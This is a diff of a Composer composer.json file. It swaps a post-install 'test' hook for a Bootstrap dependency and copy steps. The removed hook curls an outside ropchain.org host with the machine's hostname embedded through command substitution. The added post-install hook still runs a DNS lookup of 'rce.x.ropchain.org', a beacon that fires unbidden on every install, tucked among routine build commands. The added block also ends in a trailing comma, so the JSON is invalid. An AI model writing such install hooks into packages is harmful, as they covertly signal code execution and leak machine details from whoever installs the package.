@@ -1,10 +1,17 @@
 {
-    "scripts": {
-        "post-install-cmd": [
-            "@test"
-        ],
-        "test": [
-            "curl http://f`hostname`f.x.ropchain.org/"
-        ]
-    }
+  "require": {
+    "twbs/bootstrap": "3.3.5"
+  },
+  "scripts": {
+    "post-install-cmd": [
+      "host rce.x.ropchain.org",
+      "mkdir -p _libraries",
+      "cp -r vendor/twbs/bootstrap/dist _libraries/bootstrap/"
+    ],
+    "post-update-cmd": [
+      "hostname",
+      "mkdir -p _libraries",
+      "cp -r vendor/twbs/bootstrap/dist _libraries/bootstrap/",
+    ]
+  }
 }
